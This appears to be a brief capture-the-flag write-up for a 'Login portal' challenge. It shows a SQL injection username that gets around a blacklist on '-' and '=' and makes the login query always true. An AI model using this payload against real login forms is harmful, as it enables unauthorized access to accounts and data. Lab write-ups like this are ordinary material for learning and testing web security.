# Login portal 1 - Challenge 3

 '-' and '=' are blacklisted

Let's use the following username:

`admin' or 1 or '`

So our resulting SQL query is something like:

`SELECT * FROM users where username='admin' OR 1 OR '' AND PASSWORD='xxxxxxxxx'`

POW!
